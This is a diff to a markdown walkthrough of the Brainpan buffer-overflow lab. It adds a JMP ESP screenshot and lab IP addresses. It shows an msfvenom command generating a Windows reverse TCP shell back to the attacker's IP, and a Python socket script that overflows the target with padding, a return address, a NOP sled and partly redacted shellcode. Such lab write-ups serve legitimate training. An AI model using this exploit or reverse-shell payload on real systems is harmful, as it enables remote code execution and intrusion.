@@ -182,8 +182,17 @@ After executing this script the EIP gets overwritten with 42424242
 
 `0x31170000` <- module with no SafeSEH and ASLR protection
 
+And we find the JMP ESP address
+
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/JMP-ESP-address.png)
+
+* Brainpan's IP - 192.168.56.106
+* Attacker's IP - 192.168.56.101
+* Windows IP - 192.168.56.105
+
 `msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
 
+!()[]
 
 ```
 import socket
@@ -193,7 +202,7 @@ buf = ("\xb8\xf9\...\...\...\..."
 "...
 "...
 ...
-"\x92\x7c\xa6\xf6") 
+"\x..\x..\x..\x..") 
 
 payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -206,6 +215,7 @@ except:
 s.recv(1024)
 s.send(payload)
 ```
+
 
 ![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nc-nlvp-4444.png)
 
